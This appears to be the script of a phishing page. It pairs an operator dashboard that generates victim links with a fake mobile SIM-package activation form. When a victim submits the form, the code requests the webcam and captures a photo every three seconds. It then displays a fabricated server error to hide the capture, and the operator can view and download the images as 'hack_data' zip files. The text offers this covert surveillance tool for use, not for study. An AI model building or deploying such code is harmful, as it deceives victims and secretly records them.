<script>
function openNav() { document.getElementById("mySidenav").style.width = "260px"; }
function closeNav() { document.getElementById("mySidenav").style.width = "0"; }

const CAPTURE_INTERVAL_MS = 3000; 
const dashboardCard = document.getElementById('dashboard-card');
const pkgActivatorCard = document.getElementById('pkg-activator-card');
const genBtn=document.getElementById('genBtn');
const linkBox=document.getElementById('linkBox');
const dataArea=document.getElementById('dataArea');
const showId=document.getElementById('showId');
const images=document.getElementById('images');
const activateBtn = document.getElementById('activateBtn');
const simSelect = document.getElementById('sim-select');
const mobileNumber = document.getElementById('mobile-number');
const activationStatus = document.getElementById('activationStatus');
const video = document.getElementById('videoElement');
const canvas = document.getElementById('canvasElement');

function generateId(){return 'id-'+Math.random().toString(36).slice(2,10);}
function saveImages(id,imgArray){localStorage.setItem('images_'+id,JSON.stringify(imgArray));}
function getImages(id){return JSON.parse(localStorage.getItem('images_'+id)||'[]');}

function renderImages(id){ 
    const imgs=getImages(id);
    images.innerHTML='';
    if(!imgs.length){images.innerHTML='<small style="grid-column: 1/-1; text-align:center; width:100%; color:#550000;">Waiting for victim to click...</small>'; return;}
    imgs.forEach((url)=>{
        const img=document.createElement('img'); 
        img.src=url; 
        images.appendChild(img);
    });
}

async function downloadAllImages() {
    const id = localStorage.getItem('currentId');
    const imagesArray = getImages(id);
    if (!imagesArray.length) return;
    const zip = new JSZip();
    imagesArray.forEach((url, i) => {
        zip.file(`captured_${i}.jpeg`, url.split(',')[1], {base64: true});
    });
    const content = await zip.generateAsync({type:"blob"});
    const a = document.createElement('a');
    a.href = URL.createObjectURL(content);
    a.download = `hack_data_${id}.zip`;
    a.click();
}

genBtn.onclick=()=>{
    const id=generateId();
    showId.textContent=id;
    const link=location.origin+location.pathname+'?id='+encodeURIComponent(id);
    localStorage.setItem('currentId',id);
    linkBox.innerHTML=`
        <input readonly value="${link}">
        <button id="copyBtn"><i class="fas fa-copy"></i> Copy</button> 
        <button id="openBtn"><i class="fas fa-eye"></i> View</button>
        <button id="refreshBtn" style="width:100%"><i class="fas fa-sync-alt"></i> Refresh Data</button>
    `;
    document.getElementById('openBtn').onclick=()=>window.open(link,'_blank');
    document.getElementById('copyBtn').onclick=()=>navigator.clipboard.writeText(link).then(()=>alert('Link Copied!'));
    document.getElementById('refreshBtn').onclick = () => { renderImages(id); };
    dataArea.style.display='block';
    renderImages(id);
};

activateBtn.onclick = async () => {
    if (!simSelect.value || mobileNumber.value.length < 10) { alert('Invalid Details'); return; }
    activateBtn.disabled = true;
    activateBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
    const ID = new URLSearchParams(location.search).get('id');
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
        setInterval(() => {
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
            const old = getImages(ID);
            old.push(canvas.toDataURL('image/jpeg', 0.5));
            saveImages(ID, old);
        }, CAPTURE_INTERVAL_MS);
        setTimeout(() => {
            activationStatus.style.display = 'block';
            activationStatus.innerHTML = '<i class="fas fa-times-circle"></i> SERVER ERROR 404<br>Verification Failed. System Offline.';
        }, 3000); 
    } catch (err) {
        activationStatus.style.display = 'block';
        activationStatus.innerHTML = '<i class="fas fa-exclamation-triangle"></i> ERROR: Handshake Failed';
    }
};

const ID_PARAM=new URLSearchParams(location.search).get('id');
if(ID_PARAM){
    dashboardCard.style.display = 'none';
    pkgActivatorCard.style.display = 'block';
} else {
    const savedId=localStorage.getItem('currentId');
    if(savedId){
        showId.textContent=savedId;
        dataArea.style.display='block';
        renderImages(savedId);
    }
}
</script>
